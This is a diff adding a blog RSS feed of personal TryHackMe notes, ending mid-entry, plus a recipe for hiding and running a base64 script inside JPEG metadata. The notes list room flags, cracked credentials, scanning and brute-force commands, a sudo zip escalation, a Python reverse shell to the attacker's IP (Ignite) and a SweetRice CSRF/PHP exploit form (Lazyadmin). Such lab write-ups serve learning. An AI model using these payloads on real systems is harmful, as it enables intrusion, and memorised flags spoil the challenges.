+      <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ssh-keys/</guid>
+      <description>&lt;h2 id=&#34;create-ssh-key-in-terminal&#34;&gt;create ssh key in terminal&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen -a &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -t ed25519 -f ~/.ssh/id_ed25519 -C &lt;span class=&#34;s2&#34;&gt;&amp;#34;john@example.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-a&lt;/code&gt;: It’s the numbers of KDF (Key Derivation Function) rounds. Higher numbers result in slower passphrase verification, increasing the resistance to brute-force password cracking should the private-key be stolen.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-t&lt;/code&gt;: Specifies the type of key to create, in our case the Ed25519.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f&lt;/code&gt;: Specify the filename of the generated key file. If you want it to be discovered automatically by the SSH agent, it must be stored in the default &lt;code&gt;.ssh&lt;/code&gt; directory within your home directory.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-C&lt;/code&gt;: An option to specify a comment. It’s purely informational and can be anything. But it’s usually filled with &lt;code&gt;&amp;lt;login&amp;gt;@&amp;lt;hostname&amp;gt;&lt;/code&gt; who generated the key.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Steganography Payload</title>
+      <link>http://localhost:1313/steganography-payload/</link>
+      <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/steganography-payload/</guid>
+      <description>&lt;h2 id=&#34;create-payload&#34;&gt;Create Payload&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;create a bash script (i.e. payload.sh)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;This is the payload script&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;transform script to base64&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;embed-payload&#34;&gt;Embed Payload&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;clear metadata from image&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exiftool&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jpg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;load hash into image&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exiftool&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Certificate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;base64 hash&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jpg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;execute-payload&#34;&gt;Execute Payload&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p=$(cat image.jpg | grep Cert -a | sed &amp;#39;s/&amp;lt;[^&amp;gt;]*&amp;gt;//g&amp;#39; | base64 -D);eval $p
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Anonymous</title>
+      <link>http://localhost:1313/anonymous/</link>
+      <pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/anonymous/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Enumerate the machine.  How many ports are open? &lt;code&gt;4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What service is running on port 21? &lt;code&gt;ftp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What service is running on ports 139 and 445? &lt;code&gt;smb&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;There&amp;rsquo;s a share on the user&amp;rsquo;s computer.  What&amp;rsquo;s it called? &lt;code&gt;pics&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;user.txt &lt;code&gt;90d6f992585815ff991e68748c414740&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;root.txt &lt;code&gt;4d930091c31a622a7ed10f27999af363&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.63.78&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -vv -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brooklyn Nine Nine</title>
+      <link>http://localhost:1313/brooklyn-nine-nine/</link>
+      <pubDate>Tue, 03 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/brooklyn-nine-nine/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;User flag: &lt;code&gt;ee11cbb19052e40b07aac0ca060c23ee&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Root flag: &lt;code&gt;63a9f0ea7bb98050796b649e85481845&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.223.9&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Amy&lt;/li&gt;
+&lt;li&gt;Jake&lt;/li&gt;
+&lt;li&gt;Holt:fluffydog12@ninenine&lt;/li&gt;
+&lt;li&gt;id_rsa:kevin (angelo..brenda)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Web page had jpg.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Stegcracker cracked jpg password&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;steghide gave note.txt&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -vv -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt&lt;/code&gt;
+&lt;code&gt;steghide extract -sf brooklyn99.jpg&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Tomghost</title>
+      <link>http://localhost:1313/tomghost/</link>
+      <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/tomghost/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Compromise this machine and obtain user.txt &lt;code&gt;THM{GhostCat_1s_so_cr4sy}&lt;/code&gt;
+(found in /home/merlin)&lt;/li&gt;
+&lt;li&gt;Escalate privileges and obtain root.txt&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.160.230&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8009&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;skyfuck:8730281lkjlkjdqlksalks (found via metasploit CVE-2020-1938)&lt;/li&gt;
+&lt;li&gt;tryhackme:alexandru (pgp) (gpge2john)&lt;/li&gt;
+&lt;li&gt;merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j (john)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2020-1938&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;TF=$(mktemp -u)&lt;/code&gt;
+&lt;code&gt;sudo zip $TF /etc/hosts -T -TT &#39;sh #&#39;&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Relevant</title>
+      <link>http://localhost:1313/relevant/</link>
+      <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/relevant/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;User Flag &lt;code&gt;THM{fdk4ka34vk346ksxfr21tg789ktf45}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Root Flag &lt;code&gt;THM{1fk5kf469devly1gl320zafgl345pv}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.134.240&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;135&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;139&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;3389&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;found passwords.txt on samba share nt4wrksv&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Bob:!P@$$W0rD!123&lt;/li&gt;
+&lt;li&gt;Bill:Juw4nnaM4n420696969!$$$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2017-0143&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;smbmap -u guest -H $IP&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Ignite</title>
+      <link>http://localhost:1313/ignite/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ignite/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;User.txt &lt;code&gt;6470e394cbf6dab6a91682cc8585059b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Root.txt &lt;code&gt;b9bbcb33e11b80be759c4e844862482d&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.27.31&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;robots.txt = /fuel/&lt;/p&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;admin:admin (found via setup info on http://10.10.27.31)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2018-16763&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.27.31 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -t 30 -l milesdyson -P /usr/local/share/wordlists/rockyou.txt 10.10.27.31 http-post-form &amp;quot;/fuel/login_form:user_name=^USER^&amp;amp;password=^PASS^:Invalid login&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.18.53.113&amp;quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;
+`&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hashcat -m 110 f4c99eae874755b97610d650be565f1ac42019d1:429c6e14342dd7a63c510007a1858c26 /usr/local/share/wordlists/rockyou.txt&lt;/code&gt; = admin&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Startup</title>
+      <link>http://localhost:1313/startup/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/startup/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is the secret spicy soup recipe? &lt;code&gt;love&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What are the contents of user.txt? &lt;code&gt;THM{03ce3d619b80ccbfb3b7fc81e46c0e79}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What are the contents of root.txt? &lt;code&gt;THM{f963aaa6a430f210222158ae15c3d76d}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.179.150&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ftp&#34;&gt;FTP&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;ftp dir writeable&lt;/li&gt;
+&lt;li&gt;uploaded reverse shell to FTP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;maya&lt;/li&gt;
+&lt;li&gt;lennie:c4ntg3t3n0ughsp1c3 (found from wireshark)&lt;/li&gt;
+&lt;li&gt;vagrant&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;root-files&#34;&gt;Root Files&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/vagrant
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/recipe.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/vmlinuz.old
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/vmlinuz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/incidents
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/initrd.img
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/initrd.img.old
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;gobuster dir -u http://10.10.79.182 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Lazyadmin</title>
+      <link>http://localhost:1313/lazyadmin/</link>
+      <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/lazyadmin/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is the user flag? &lt;code&gt;THM{63e5bce9271952aad1113b6f1ac28a07}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the root flag? &lt;code&gt;THM{6637f41d0177b6f37cb20d775124699f}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;MyIP = 10.18.53.113&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;IP = 10.10.165.206&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;enumerated website with gobuster&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;found /content = enumerated&lt;/li&gt;
+&lt;li&gt;found sweetrice&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;sweetrice&#34;&gt;sweetrice&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;exploited and found backup sql database&lt;/li&gt;
+&lt;li&gt;admin account
+user&lt;html&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;body onload=&#34;document.exploit.submit();&#34;&gt;
+&lt;form action=&#34;http://localhost/sweetrice/as/?type=ad&amp;mode=save&#34; method=&#34;POST&#34; name=&#34;exploit&#34;&gt;
+&lt;input type=&#34;hidden&#34; name=&#34;adk&#34; value=&#34;hacked&#34;/&gt;
+&lt;textarea type=&#34;hidden&#34; name=&#34;adv&#34;&gt;
+&lt;?php
+echo &#39;&lt;h1&gt; Hacked &lt;/h1&gt;&#39;;
+phpinfo();?&gt;
+&amp;lt;/textarea&amp;gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;name: manager
+    password: 42f749ade7f9e195bf475f37a44cafcb
+        - hashid: md5
+        - password is= Password123
+&lt;ul&gt;
+&lt;li&gt;change main.php template to reverse shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
